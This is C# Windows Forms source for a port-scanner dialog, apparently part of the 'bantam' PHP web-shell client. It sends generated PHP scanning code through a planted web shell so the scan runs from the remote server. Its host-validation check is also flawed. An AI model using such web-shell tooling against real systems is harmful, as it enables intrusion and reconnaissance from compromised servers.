using System;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class PortScanner : Form
    {
        /// <summary>
        /// The ShellUrl that is going to perform the port scan, set in default constructor
        /// </summary>
        private readonly string ShellUrl;

        /// <summary>
        /// Preset port scanning options matches whats in the combo box (todo)
        /// </summary>
        public enum PORTS_OPTIONS
        {
            ONE_TO_1024 = 1,
            COMMON_PORTS,
            ALL_PORTS
        }

        /// <summary>
        /// Default constructor
        /// </summary>
        /// <param name="shellUrl">The selected Shell URL to use as the Server to do the port scanning</param>
        public PortScanner(string shellUrl)
        {
            InitializeComponent();

            ShellUrl = shellUrl;

            this.Text += " - (" + ShellUrl + ")";
        }

        /// <summary>
        /// Main port scan routine
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnScan_Click(object sender, EventArgs e)
        {
            if (btnScan.Enabled == false) {
                return;
            }

            string target = textBoxHost.Text;

            if (string.IsNullOrEmpty(target)
            && !Helper.IsValidIPv4(target)
            && !Helper.IsValidUri(target)) {
                labelDynStatus.Text = "Invalid IP/Url.";
                return;
            }

            btnScan.Enabled = false;

            if (BantamMain.Shells.ContainsKey(ShellUrl)) {
                string portsCode = string.Empty;

                bool encryptResponse = BantamMain.Shells[ShellUrl].ResponseEncryption;
                int ResponseEncryptionMode = BantamMain.Shells[ShellUrl].ResponseEncryptionMode;

                if (int.TryParse(textBoxPorts.Text, out int outVal)) {
                    if (!string.IsNullOrEmpty(textBoxPorts.Text)) {
                        portsCode = "$ports = array('" + textBoxPorts.Text + "');";
                        labelDynStatus.Text = "";
                    } else {
                        if (comboBoxCommonPorts.SelectedIndex != 0) {
                            if (comboBoxCommonPorts.SelectedIndex == (int)PORTS_OPTIONS.ONE_TO_1024) {
                                portsCode = PhpBuilder.PortsScannerPorts1To1024();
                                labelDynStatus.Text = "** May fail unless on local IP";
                            } else if (comboBoxCommonPorts.SelectedIndex == (int)PORTS_OPTIONS.COMMON_PORTS) {
                                labelDynStatus.Text = "** May fail unless on local IP";
                                portsCode = PhpBuilder.PortScannerPortsCommon();
                            } else if (comboBoxCommonPorts.SelectedIndex == (int)PORTS_OPTIONS.ALL_PORTS) {
                                portsCode = PhpBuilder.PortScannerPortsAll();
                                labelDynStatus.Text = "** May fail unless on local IP";
                            }
                        }
                    }
                    string phpCode = PhpBuilder.PortScanner(textBoxHost.Text, portsCode, encryptResponse);
                    BantamMain.ExecutePHPCodeDisplayInRichTextBox(ShellUrl, phpCode, "Opened Ports - " + textBoxHost.Text, encryptResponse, ResponseEncryptionMode);
                }
            }
            btnScan.Enabled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void comboBoxCommonPorts_SelectedIndexChanged(object sender, EventArgs e)
        {
            btnScan.Enabled = true;
            if (comboBoxCommonPorts.SelectedIndex != 0) {
                textBoxPorts.Text = "";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxPorts_TextChanged(object sender, EventArgs e)
        {
            comboBoxCommonPorts.SelectedIndex = 0;
            btnScan.Enabled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxPorts_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }
    }
}
